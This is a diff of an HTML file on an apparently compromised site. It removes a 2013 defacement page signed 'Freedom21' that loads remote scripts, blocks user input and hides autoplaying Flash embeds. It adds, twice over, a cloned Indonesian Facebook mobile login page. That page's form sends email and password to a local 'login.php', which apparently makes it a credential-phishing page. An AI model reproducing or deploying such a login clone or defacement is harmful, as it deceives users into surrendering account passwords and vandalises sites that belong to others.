@@ -1,346 +1,199 @@
-<font size="5"><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" SYSTEM
- 
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
- 
-<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
-<head>
- 
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<title>Hacked By Freedom21</title>
-<link rel="SHORTCUT ICON" href="http://dotcomcell.com/kumpulan-artikel/wp-
-content/uploads/2011/08/gambar-animasi-bendera-merah-putih-berkibar1.gif"
- 
-href="http://2.bp.blogspot.com/_OoNYJfsEuXI/TLGUge5UFdI/AAAAAAAAAY0/fCmNi6fnkp4/s400/
-indonesia.gif">
-<style type="text/css">body, a, a:hover {cursor:
-url(http://hellox.persiangig.com/DefacePage/negro.cur), progress;}
- 
-</style>
-<!-- CSS -->
-<link rel="stylesheet" type="text/css"
-href="http://hellox.persiangig.com/DefacePage/jquery00.css" media="all">
-<link rel="stylesheet" type="text/css"
-href="http://hellox.persiangig.com/DefacePage/prettyPh.css" media="all">
-<link rel="stylesheet" type="text/css"
-href="http://hellox.persiangig.com/DefacePage/style000.css" media="all">
- 
-<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/jquery-
-1.js"></script>
-<script type="text/javascript" src="http://hellox.persiangig.com/DefacePage/cufon-
-yu.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/Yanone_K.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery00.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery01.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery02.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery03.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery04.js"></script>
- 
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery05.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery06.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/jquery07.js"></script>
-<script type="text/javascript"
-src="http://hellox.persiangig.com/DefacePage/custom00.js"></script>
-<script type="text/javascript">
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-20402842-6']);
-  _gaq.push(['_trackPageview']);
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async
-= true;
-    ga.src ='http://hellox.persiangig.com/DefacePage/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga,
-s);
-  })();
-</script><script language="JavaScript" type="text/javascript">
-mensaje = '*<--Blackshadow-->*';font = 'OCR A Extended';size = 2.5;color =
-'#00FF00';velocidad = 0.6;
-n4 = (document.layers);ie = (document.all);n6 = (document.getElementById);
-mensaje = mensaje.split('');n = mensaje.length;
-a = size*10;ymouse = 0;xmouse = 0;props = "<font face="+font+" color="+color+"
-size="+size+">";
-if (n4){for ( i = 0; i < n; i++)document.write('<layer left="0" top="0" width="+a+"
-name="n4mensaje'+i+'" height="+a
- 
-+"><center>
-'+props+mensaje[i]+'</font></center>
-</layer>');}else if (ie){document.write('<div id="padre"
-style="position:absolute;top:0px;left:0px">
-<div style="position:relative">
-');for (i=0; i < n; i++)document.write('<div id="iemensaje"
-style="position:absolute;top:0px;left:0;height:'+a+';width:'+a
- 
-+';text-align:center">'+props+mensaje[i]+'</font></div>
-');document.write('</div>
-</div>
-');}else if (n6){document.write('<div id="padre"
-style="position:absolute;top:0px;left:0px">
-<div style="position:relative">
-');for (i = 0; i < n; i++)document.write('<div id="iemensaje'+i+'"
-style="position:absolute;top:0px;left:0;height:'+a
- 
-+';width:'+a+';text-align:center">'+props+mensaje[i]+'</font></div>
-');document.write('</div>
-</div>
-');}
-if(n4)window.captureEvents(Event.MOUSEMOVE);
-function Mouse(evento){ if(ie){xmouse = event.x+20;ymouse = event.y+20;}else if(n4 ||
-n6){xmouse = evento.pageX
- 
-+20;ymouse = evento.pageY+20;}}
-if(n4)window.onMouseMove = Mouseelse if(ie || n6)document.onmousemove = Mouse;
-y = new Array();x = new Array();Y = new Array();X = new Array();Yaux = new
-Array();Xaux = new Array();
-for (i=0; i < n; i++){y[i] = 0;x[i] = 0;Y[i] = 0;X[i] = 0;Yaux[i] = 0;Xaux[i] = 0;}
-function asigna(){if (ie)padre.style.top = document.body.scrollTop;
-for (i = 0; i < n; i++){if(n4){document.layers['n4mensaje'+i].top =
-y[i];document.layers['n4mensaje'+i].left = x[i]+(i*
- 
-(a/2));}else if(ie){iemensaje[i].style.top = y[i];iemensaje[i].style.left = x[i]+(i*
-(a/2));}else if(n6){eval
- 
-("document.getElementById('iemensaje"+i+"').style.top =
-'"+y[i]+"px'");eval("document.getElementById('iemensaje"+i
- 
-+"').style.left = '"+(x[i]+(i*(a/2)))+"px'");} }}
-function ondula(){y[0]=Math.round(Y[0] +=((ymouse)-
-Y[0])*velocidad);x[0]=Math.round(X[0] +=((xmouse)-X[0])
- 
-*velocidad);
-for (var i = 1; i < n; i++){Yaux[i] = Math.round(Y[i]);Xaux[i ]=
-Math.round(X[i]);y[i] = Math.round(Y[i]=Yaux[i]+(y[i-1]-Y
- 
-[i])*velocidad);x[i] = Math.round(X[i]=Xaux[i]+(x[i-1]-
-X[i])*velocidad);}asigna();setTimeout('ondula()',50);}
-window.onload = ondula;
-</script>
-<link rel="openid.server" href="http://www.blogger.com/openid-server.g" />
-</head>
- 
-<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return
-false;'>
-<embed src="http://error-404.do.am/file/Welcome.swf" width="0" height="0"
-allowfullscreen="true"
- 
-allowscriptaccess="always"></embed>
-    <!-- wrappage begin here -->
- 
-    <div id="wrappage">
- 
-        <!-- container begin here -->
-        <div class="container">
-            <!-- top block begin here -->
-                         <div class="top">
-             <div class="energy">
-</div>
-<div class="top-block">
-                    <a class="logo">This Site Has Been Hacked</a>
- 
-                    <div class="bg-e-button">
- 
-</div>
-<a href class="open"><img src="http://hellox.persiangig.com/DefacePage/flash000.png"
-alt=""></a>
-                    </div>
-</div>
-<!-- top block end here -->
-            <!-- center block begin here -->
-            <div class="center-block">
-             <!-- ???? -->
-             <div class="scanner clearfix">
- 
-              <div class="scanner-block">
-               <div class="scanner-box left">
- 
-                <div class="scanner-line">
-</div>
-</div>
- 
-<ul class="data left">
-                            <li class="search">Waiting. . . . .</li>
-<li class="search-d"># / > Logged In..</li>
-                <li class="search-d"># / > Identify Unknown..</li>
-                <li class="search-d"># / > Access Granted..</li>
-<li class="search-d"># / > Welcome admin..</li>
-</ul>
-</div>
-</div>
-<!-- ??? ???? -->
- 
-                <div class="main">
-                 <div class="load">
-</div>
- 
-<div class="shut-left">
-</div>
-<div class="shut-right">
-</div>
-<div class="page">
-                    <div class="box-left left">
-                     <div class="info">
-                       <ul class="socicon left">
- 
-                                           <img
-src="http://s21.postimg.org/d7irajxbr/dddddfffffffffffffff.jpg" width="190"
-height="160" alt="My Mom" class="right"></br></br>
-</a></li>
-</ul>
-<ul class="left who">
-<li><center>
- 
-<font color="gold"><br /></font></center>
-</li>
-</ul>
-<P ALIGN=center><object data='http://flash-mp3-player.net/medias/player_mp3.swf'
-height='0' type='application/x-shockwave-flash' width='0'>
-<param name=' value='#'/><br/><param name='FlashVars' value='mp3=https://xover2-jkt-
-3d-x.indowebster.com/download-
-vip/8/f3f2efb64a5c279db67fead286dc23dd.mp3/[files.indowebster.com]-Mcr_-_Welcome_To_The_Black_Parade.mp3&loop=1&autoplay=1&volume=150'/></object></p></embed></CENTER>
- 
- 
- 
-                       </div>
-<ul id="menu" class="right">
-<li>
-                              <a href="#msg" class="selected">Message</a>
- 
-                                                          <a href="#sysinfo"
-class="selected">About
- 
-Me</a>
-                                                         
-
-<a href="#Thanks"
-class="selected">Thanks To</a>
- 
-                                                         
-                            </li>
-</ul>
-</div>
-<div class="cont left">
-                        <!-- ????? -->
- 
-                            <div id="msg" class="box left">
-                                        <div class="box-content">
-                                        <h3>
-<font color="red">Welcome <font color="red"> To This Site</font></h3>
- 
-<h3>
-<font color="lime"></font></h3>
-<p class="sub">
-<font color="lime"></font></p>
-<strong><center>
-<font color="lime"></font></center>
-</strong>
-                                       
- 
-<p>
-<font face="Rockwell" color="red">This Site Has Been Hacked By<font face="Rockwell"
-color="lime"> Freedom21
-<p>
-<font face="Rockwell" color="green"> We Not Hack To Learn But We Learn To Hack !
-<p>
-<font face="Rockwell" color="Green"> Fuck You Admin ! This Site Is Vulnerability
-Please Patch Your System ! Or We Back ! <p>
-<font face="Rockwell" color="Green"><font face="Rockwell" color="red"><br><font
-face="Rockwell" color="red">Some Member Of Java Cyber Army
-<center>
-                                       
-                                       
-                                       
-                                       
-                                        </div>
-</div>
-<h3>
-<font color="lime"></font></h3>
-<p class="sub">
-<font color="lime"></font></p>
-<strong><center>
-<font color="lime"></font></center>
-</strong>
-                                       
- 
-<p>
-<font face="Rockwell" color="lime"><div id="sysinfo" class="box left">
- 
-                                        <div class="box-content">
-                   <h3>
-                                        Freedom21
-                                    </h3>
-                                    <p class="sub">
-                                     Member Of JKT48 Cyber Team
-                                    </p>
-                                    <p>
-<font face="rockwell" font color="lime"> I am Not A Hacker .. But I am Just Security
-Tester , I am Just Tested Your Security<br>            
 
 
-                                        </div>
-</div>
-<h3>
-<font color="lime"></font></h3>
-<p class="sub">
-<font color="lime"></font></p>
-<strong><center>
-<font color="lime"></font></center>
-</strong>
-                                       
- 
-<p>
-<font face="Rockwell" color="lime"><div id="Thanks" class="box left">
- 
-                                        <div class="box-content">
-                   <h3>
-                                        Thanks To:
-                                    </h3>
-                                 
-                                    </p>
-                                    <p>
-<font face="rockwell" font color="lime"> | Allah SWT | Cindy JKT48 | Melody JKT48 | Hmei7 | Freedom21 | Newbie Cyber Team | Indonesian Fighter Cyber | Indonesian Cyber Army | Java Cyber Army | JKT48 CYBER TEAM | VVota404 | Harugon48 | All Member JKT48 | Udin404 |
-<br/>            
- 
-                                               
- 
-</p>
- 
- 
- 
- 
- 
-</p>
-</div>
-  </div>
-                               
- 
-                <div id="irc" class="box left">
-                            <div class="box-content">
-                            </div>
-                        </div>
-                    </div>
-                  </div>
-                </div>
-            </div>
-            <div class="bottom">
-                <div class="bottom-block">
-                    <h1 class="left">Hacked By Freedom21</h1>
-                    <h5 class="right">Copyright 2013  By ./Harugon48 All Rights
-Reserved<br>
-<EMBED SRC="http://error-404.do.am/50256-h4ck3d.swf" AUTOSTART="TRUE" LOOP="TRUE" 
-WIDTH="1" HEIGHT="1" ALIGN="CENTER" width="0" height="0"></EMBED>
-<p align="center">
+<head title="Welcome to Facebook"><title>Selamat datang di Facebook</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><meta name="referrer" content="default" id="meta_referrer" /><noscript><meta http-equiv="X-Frame-Options" content="deny" /></noscript><style type="text/css">/*<![CDATA[*/.nontouch .mobile-login-field .input{width:90%}
+.mobile-login-field-email{direction:ltr}
+#footer .acg{background:#fff}._fco #header td{padding:2px;vertical-align:middle}
+._fco .other-links{line-height:2em}
+._fco .button_area .btnC{color:#fff}
+._fco .button_area .btnR{background-color:#b9b9b9;color:#000}
+._fco .button_area .btnR:hover{background-color:#999;color:#000}
+._fcp div.button_area{width:89%}
+._fcp #form_fields > div > div{padding:0 3px 0 0}
+._fcp .button_area .largeBtn{padding:5px}
+._4u99{color:#87898c;font-size:13px;font-weight:700;padding:5px 0 0 4px}
+._4u9a #login_form hr{display:none}
+._4u9a ._4u9b, ._4u9a ._4u9b .button_area, ._4u9a ._4u9b ._4u99{background-color:#fbfbfb}
+._4u9a ._4u9b{border-bottom:1px solid #fff;border-top:1px solid #cacdd3;margin-top:7px;padding-bottom:10px;padding-top:7px}
+._4u9a .other-links{border-bottom:1px solid #cacdd3}
+._4u9a #footer{background-color:#eceff5;padding-top:6px}
+._4u9a #footer div{background-color:#eceff5}
+._4u9a._4u9c ._4u9b{border-bottom:0;padding-bottom:0}
+._4u9a._4u9c #footer, ._4u9a._4u9c #footer div, ._4u9a._4u9c .other-links{background-color:#fbfbfb}form{margin:0;border:0}.acw{background-color:#fff}
+.acbk{background-color:#000}
+.acb{background-color:#3b5998}
+.aclb{background-color:#eceff5}
+.acdb{background-color:#31394a}
+.acg{background-color:#f2f2f2}
+.acy{background-color:#fffbe2;color:#7f7212}
+.acr{background-color:#ffebe8;color:#6d220d}.aps{padding:2px 3px}
+.apm{padding:4px 3px}
+.apl{padding:6px 3px}.input{border:solid 1px #999;border-top-color:#888;margin:0;padding:3px}
+.nontouch .input{padding:3px 3px 4px 0}.btn{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center}
+.btn.largeBtn{display:block}
+button.largeBtn,
+input.largeBtn{width:100%}
+.btnForm{display:inline;border:none;padding:0}
+.btnD,
+.acb .btnC,
+.btnI,
+.nontouch a.btnD,
+.nontouch .acb a.btnC,
+.nontouch a.btnI{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77}
+.acb .btnD,
+.btnC,
+.acb .btnI,
+.nontouch .acb a.btnD,
+.nontouch a.btnC,
+.nontouch .acb a.btnI{background:#5b74a8;border-color:#8a9ac5 #29447E #1a356e;color:#fff}
+.btnS,
+.nontouch a.btnS{background:#69a74e;border-color:#98c37d #3b6e22 #2c5115;color:#fff}
+.btnN,
+.nontouch a.btnN{background:#ee3f10;border-color:#f48365 #8d290e #762610;color:#fff}.btn,
+.btnForm{display:inline-block}
+.btn + .btn,
+.btnForm + .btnForm,
+.btn + .btnForm,
+.btnForm + .btn{margin-left:3px}
+.largeBtn + .largeBtn{margin-left:0;margin-top:6px}
+.btn input{background:none;border:none;margin:0;padding:0}
+.btnD input,
+.acb .btnC input,
+.btnI input{color:#505c77}
+.acb .btnD input,
+.btnC input,
+.acb .btnI input,
+.btnS input,
+.btnN input{color:#fff}.nontouch a,
+.nontouch a:visited{color:#3b5998;text-decoration:none}
+.nontouch .sub,
+.nontouch .sub:visited{color:gray}
+.nontouch .sec,
+.nontouch .sec:visited{color:#6d84b4}
+.nontouch .inv,
+.nontouch .inv:visited{color:#fff}.nontouch a:focus,
+.nontouch a:hover,
+.nontouch .sub:focus,
+.nontouch .sub:hover,
+.nontouch .sec:focus,
+.nontouch .sec:hover{background-color:#3b5998;color:#fff}
+.nontouch .inv:focus,
+.nontouch .inv:hover{background-color:#fff;color:#3b5998}.fcb{color:#000}
+.fcg{color:gray}
+.fcw{color:#fff}
+.fcl{color:#3b5998}
+.fcs{color:#6d84b4}.mfsxs{font-size:x-small}
+.mfss{font-size:small}
+body, tr, input, textarea, .mfsm{font-size:medium}
+.mfsl{font-size:large}._fcm #header .btn{background-color:#69a74e;border-color:#98c37d #3b6e22 #2c5115}
+._fcn #header .btn{background-color:#b9b9b9;border-color:#D5D5D5 #909090 #757575;color:#000}.mBasicOnDesktop{margin:0 auto;max-width:600px}.lr{width:100%}
+.lr .r{text-align:right}.img{border:0;display:inline-block;vertical-align:top}
+i.img u{position:absolute;width:0;height:0;overflow:hidden}.abt{border-top:1px solid}
+.abb{border-bottom:1px solid}
+.acw{border-color:#e9e9e9}
+.acb{border-color:#1d4088}
+.aclb{border-color:#d8dfea}
+.acg{border-color:#ccc}
+.acy{border-color:#e2c822}
+.acr{border-color:#dd3c10}body{margin:0;padding:0;text-align:left;direction:ltr}
+body, tr, input, textarea, button{font-family:sans-serif}/*]]>*/</style><script>window.localStorage&&window.localStorage.clear();</script></head><body class="nontouch acw"><div class="mfsm"><div id="viewport" class="mBasicOnDesktop"><div id="root" tabindex="0" role="main" class="_fco _fcm acw"><div class="acb aps" id="header"><table cellspacing="0" cellpadding="0" class="lr"><tr><td valign="top"><a href="http://m.facebook.com/login.php"><img src="http://static.ak.fbcdn.net/rsrc.php/v2/yz/r/aKhO2tw3FnO.png" width="76" height="20" class="img" alt="facebook" /></a></td><td valign="top" class="r"><a class="btn btnI" href="http://m.facebook.com/r.php">Mendaftar</a></td></tr></table></div><div id="objects_container"><div class="acy aps abb"><span class="mfss">Anda harus masuk dulu.</span></div><div class="aclb"><div class="loginInner"><div class="acy apl abt abb"><a href="http://m.facebook.com/fbapp/d/facebook.jad">Dapatkan Facebook Seluler dan menjelajah lebih cepat.</a></div><form method="post" class="mobile-login-form _fcp" id="login_form" novalidate="1" action="login.php"><input type="hidden" name="lsd" value="AVrxuZUG" autocomplete="off" /><input type="hidden" name="charset_test" value="â¬,Â´,â¬,Â´,æ°´,Ð,Ð" /><input type="hidden" name="version" value="1" /><input type="hidden" id="ajax" name="ajax" value="0" /><input type="hidden" id="width" name="width" value="0" /><input type="hidden" id="pxr" name="pxr" value="0" /><input type="hidden" id="gps" name="gps" value="0" /><input type="hidden" autocomplete="off" name="m_ts" value="1359915674" /><input type="hidden" autocomplete="off" name="li" value="mqoOUZbnCMAWYkzOEY7RIQB-" /><input type="hidden" autocomplete="off" name="signup_layout" value="layout|bottom_clean||wider_form||prmnt_btn|special||st|create||header_button||hdbtn_color|green||Feb1" /><input type="hidden" autocomplete="off" name="laststage" value="first" /><div id="form_fields"><div class="mobile-login-field mobile-login-field-email aclb apl"><div>Email atau Telepon<br /><input class="input" autocorrect="off" autocapitalize="off" name="email" type="text" /></div></div><div class="mobile-login-field aclb apl"><div>Kata Sandi<br /><input class="input" autocorrect="off" autocapitalize="off" name="pass" type="password" /></div></div></div><div class="button_area aclb apl"><input value="Masuk" type="submit" name="login" class="btn btnC largeBtn" size="0" /></div><hr style="background-color:#cccccc;height:1px;border:0px solid #fff;margin:0.3em auto;width:100%;" /><div class="_4u9b aclb"><div class="button_area aclb apl"><a class="btn btnS largeBtn" href="http://m.facebook.com/r.php">Buat Akun Baru</a></div></div><noscript><input type="hidden" autocomplete="off" name="_fb_noscript" value="true" /></noscript></form><div class="other-links aclb apl"><span class="mfsm fcg"><a href="http://m.facebook.com/login/identify">Lupa kata sandi?</a><br /><a href="http://m.facebook.com/help">Pusat Bantuan</a></span></div></div></div></div><div id="footer"><div class="acg apm"><span class="mfss fcg"><b>Bahasa Indonesia</b> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/index.php?refsrc=http%3A%2F%2Fm.facebook.com%2Findex.php&_rdr">English (US)</a> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/index.php?refsrc=http%3A%2F%2Fm.facebook.com%2Fa%2Flanguage.php&_rdr">Español</a> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/language.php?n=http%3A%2F%2Fm.facebook.com%2Findex.php&refid=8">Lainnya...</a></span></div><div class="acg apm"><span class="mfss fcg">Facebook © 2013</span></div><div class="acg apm"><span class="mfss fcg"><a href="http://wap.indosat.com"> FB SMS tanpa batas ketik FB kirim ke 32665</ a></span></div></div></div></div><input type="hidden" id="m_user_DEPRECATED" value="0" /><div id="static_templates"></div></div></body></html><!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 
-                </div>
-            </div>
-        </div>
-    </div>
-</body>
-</html>
+
+<head title="Welcome to Facebook"><title>Selamat datang di Facebook</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><meta name="referrer" content="default" id="meta_referrer" /><noscript><meta http-equiv="X-Frame-Options" content="deny" /></noscript><style type="text/css">/*<![CDATA[*/.nontouch .mobile-login-field .input{width:90%}
+.mobile-login-field-email{direction:ltr}
+#footer .acg{background:#fff}._fco #header td{padding:2px;vertical-align:middle}
+._fco .other-links{line-height:2em}
+._fco .button_area .btnC{color:#fff}
+._fco .button_area .btnR{background-color:#b9b9b9;color:#000}
+._fco .button_area .btnR:hover{background-color:#999;color:#000}
+._fcp div.button_area{width:89%}
+._fcp #form_fields > div > div{padding:0 3px 0 0}
+._fcp .button_area .largeBtn{padding:5px}
+._4u99{color:#87898c;font-size:13px;font-weight:700;padding:5px 0 0 4px}
+._4u9a #login_form hr{display:none}
+._4u9a ._4u9b, ._4u9a ._4u9b .button_area, ._4u9a ._4u9b ._4u99{background-color:#fbfbfb}
+._4u9a ._4u9b{border-bottom:1px solid #fff;border-top:1px solid #cacdd3;margin-top:7px;padding-bottom:10px;padding-top:7px}
+._4u9a .other-links{border-bottom:1px solid #cacdd3}
+._4u9a #footer{background-color:#eceff5;padding-top:6px}
+._4u9a #footer div{background-color:#eceff5}
+._4u9a._4u9c ._4u9b{border-bottom:0;padding-bottom:0}
+._4u9a._4u9c #footer, ._4u9a._4u9c #footer div, ._4u9a._4u9c .other-links{background-color:#fbfbfb}form{margin:0;border:0}.acw{background-color:#fff}
+.acbk{background-color:#000}
+.acb{background-color:#3b5998}
+.aclb{background-color:#eceff5}
+.acdb{background-color:#31394a}
+.acg{background-color:#f2f2f2}
+.acy{background-color:#fffbe2;color:#7f7212}
+.acr{background-color:#ffebe8;color:#6d220d}.aps{padding:2px 3px}
+.apm{padding:4px 3px}
+.apl{padding:6px 3px}.input{border:solid 1px #999;border-top-color:#888;margin:0;padding:3px}
+.nontouch .input{padding:3px 3px 4px 0}.btn{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center}
+.btn.largeBtn{display:block}
+button.largeBtn,
+input.largeBtn{width:100%}
+.btnForm{display:inline;border:none;padding:0}
+.btnD,
+.acb .btnC,
+.btnI,
+.nontouch a.btnD,
+.nontouch .acb a.btnC,
+.nontouch a.btnI{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77}
+.acb .btnD,
+.btnC,
+.acb .btnI,
+.nontouch .acb a.btnD,
+.nontouch a.btnC,
+.nontouch .acb a.btnI{background:#5b74a8;border-color:#8a9ac5 #29447E #1a356e;color:#fff}
+.btnS,
+.nontouch a.btnS{background:#69a74e;border-color:#98c37d #3b6e22 #2c5115;color:#fff}
+.btnN,
+.nontouch a.btnN{background:#ee3f10;border-color:#f48365 #8d290e #762610;color:#fff}.btn,
+.btnForm{display:inline-block}
+.btn + .btn,
+.btnForm + .btnForm,
+.btn + .btnForm,
+.btnForm + .btn{margin-left:3px}
+.largeBtn + .largeBtn{margin-left:0;margin-top:6px}
+.btn input{background:none;border:none;margin:0;padding:0}
+.btnD input,
+.acb .btnC input,
+.btnI input{color:#505c77}
+.acb .btnD input,
+.btnC input,
+.acb .btnI input,
+.btnS input,
+.btnN input{color:#fff}.nontouch a,
+.nontouch a:visited{color:#3b5998;text-decoration:none}
+.nontouch .sub,
+.nontouch .sub:visited{color:gray}
+.nontouch .sec,
+.nontouch .sec:visited{color:#6d84b4}
+.nontouch .inv,
+.nontouch .inv:visited{color:#fff}.nontouch a:focus,
+.nontouch a:hover,
+.nontouch .sub:focus,
+.nontouch .sub:hover,
+.nontouch .sec:focus,
+.nontouch .sec:hover{background-color:#3b5998;color:#fff}
+.nontouch .inv:focus,
+.nontouch .inv:hover{background-color:#fff;color:#3b5998}.fcb{color:#000}
+.fcg{color:gray}
+.fcw{color:#fff}
+.fcl{color:#3b5998}
+.fcs{color:#6d84b4}.mfsxs{font-size:x-small}
+.mfss{font-size:small}
+body, tr, input, textarea, .mfsm{font-size:medium}
+.mfsl{font-size:large}._fcm #header .btn{background-color:#69a74e;border-color:#98c37d #3b6e22 #2c5115}
+._fcn #header .btn{background-color:#b9b9b9;border-color:#D5D5D5 #909090 #757575;color:#000}.mBasicOnDesktop{margin:0 auto;max-width:600px}.lr{width:100%}
+.lr .r{text-align:right}.img{border:0;display:inline-block;vertical-align:top}
+i.img u{position:absolute;width:0;height:0;overflow:hidden}.abt{border-top:1px solid}
+.abb{border-bottom:1px solid}
+.acw{border-color:#e9e9e9}
+.acb{border-color:#1d4088}
+.aclb{border-color:#d8dfea}
+.acg{border-color:#ccc}
+.acy{border-color:#e2c822}
+.acr{border-color:#dd3c10}body{margin:0;padding:0;text-align:left;direction:ltr}
+body, tr, input, textarea, button{font-family:sans-serif}/*]]>*/</style><script>window.localStorage&&window.localStorage.clear();</script></head><body class="nontouch acw"><div class="mfsm"><div id="viewport" class="mBasicOnDesktop"><div id="root" tabindex="0" role="main" class="_fco _fcm acw"><div class="acb aps" id="header"><table cellspacing="0" cellpadding="0" class="lr"><tr><td valign="top"><a href="http://m.facebook.com/login.php"><img src="http://static.ak.fbcdn.net/rsrc.php/v2/yz/r/aKhO2tw3FnO.png" width="76" height="20" class="img" alt="facebook" /></a></td><td valign="top" class="r"><a class="btn btnI" href="http://m.facebook.com/r.php">Mendaftar</a></td></tr></table></div><div id="objects_container"><div class="acy aps abb"><span class="mfss">Anda harus masuk dulu.</span></div><div class="aclb"><div class="loginInner"><div class="acy apl abt abb"><a href="http://m.facebook.com/fbapp/d/facebook.jad">Dapatkan Facebook Seluler dan menjelajah lebih cepat.</a></div><form method="post" class="mobile-login-form _fcp" id="login_form" novalidate="1" action="login.php"><input type="hidden" name="lsd" value="AVrxuZUG" autocomplete="off" /><input type="hidden" name="charset_test" value="â¬,Â´,â¬,Â´,æ°´,Ð,Ð" /><input type="hidden" name="version" value="1" /><input type="hidden" id="ajax" name="ajax" value="0" /><input type="hidden" id="width" name="width" value="0" /><input type="hidden" id="pxr" name="pxr" value="0" /><input type="hidden" id="gps" name="gps" value="0" /><input type="hidden" autocomplete="off" name="m_ts" value="1359915674" /><input type="hidden" autocomplete="off" name="li" value="mqoOUZbnCMAWYkzOEY7RIQB-" /><input type="hidden" autocomplete="off" name="signup_layout" value="layout|bottom_clean||wider_form||prmnt_btn|special||st|create||header_button||hdbtn_color|green||Feb1" /><input type="hidden" autocomplete="off" name="laststage" value="first" /><div id="form_fields"><div class="mobile-login-field mobile-login-field-email aclb apl"><div>Email atau Telepon<br /><input class="input" autocorrect="off" autocapitalize="off" name="email" type="text" /></div></div><div class="mobile-login-field aclb apl"><div>Kata Sandi<br /><input class="input" autocorrect="off" autocapitalize="off" name="pass" type="password" /></div></div></div><div class="button_area aclb apl"><input value="Masuk" type="submit" name="login" class="btn btnC largeBtn" size="0" /></div><hr style="background-color:#cccccc;height:1px;border:0px solid #fff;margin:0.3em auto;width:100%;" /><div class="_4u9b aclb"><div class="button_area aclb apl"><a class="btn btnS largeBtn" href="http://m.facebook.com/r.php">Buat Akun Baru</a></div></div><noscript><input type="hidden" autocomplete="off" name="_fb_noscript" value="true" /></noscript></form><div class="other-links aclb apl"><span class="mfsm fcg"><a href="http://m.facebook.com/login/identify">Lupa kata sandi?</a><br /><a href="http://m.facebook.com/help">Pusat Bantuan</a></span></div></div></div></div><div id="footer"><div class="acg apm"><span class="mfss fcg"><b>Bahasa Indonesia</b> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/index.php?refsrc=http%3A%2F%2Fm.facebook.com%2Findex.php&_rdr">English (US)</a> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/index.php?refsrc=http%3A%2F%2Fm.facebook.com%2Fa%2Flanguage.php&_rdr">Español</a> <span role="separator" aria-hidden="true">·</span> <a class="sec" href="http://m.facebook.com/language.php?n=http%3A%2F%2Fm.facebook.com%2Findex.php&refid=8">Lainnya...</a></span></div><div class="acg apm"><span class="mfss fcg">Facebook © 2013</span></div><div class="acg apm"><span class="mfss fcg"><a href="http://wap.indosat.com"> FB SMS tanpa batas ketik FB kirim ke 32665</ a></span></div></div></div></div><input type="hidden" id="m_user_DEPRECATED" value="0" /><div id="static_templates"></div></div></body></html>
